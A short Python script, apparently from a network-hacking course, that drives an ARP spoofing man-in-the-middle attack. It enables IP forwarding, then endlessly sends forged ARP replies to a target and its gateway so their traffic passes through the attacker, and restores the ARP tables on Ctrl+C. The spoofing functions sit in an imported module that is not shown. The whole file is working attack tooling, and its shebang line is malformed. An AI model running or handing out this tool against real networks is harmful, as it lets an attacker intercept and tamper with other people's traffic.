#!usr/bin/env python
import sys
import time
import arp_spoof


options = arp_spoof.get_arguments()
# target_ip = "192.168.86.133"
# gateway_ip = "192.168.86.2"
arp_spoof.enable_ip_forwarding()
packet_number = 0
try:
    while True:
        arp_spoof.spoof(options.target_ip, options.gateway_ip)
        arp_spoof.spoof(options.gateway_ip, options.target_ip)
        packet_number += 2
        # python2
        print("\r[+] Packets sent: " + str(packet_number)),
        sys.stdout.flush()
        # python 3
        # print("\r[+] Packets sent: " + str(packet_number), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C.. Resetting ARP tables")
    arp_spoof.restore(options.target_ip, options.gateway_ip)
    arp_spoof.restore(options.gateway_ip, options.target_ip)

# 192.168.86.133
# 192.168.86.2
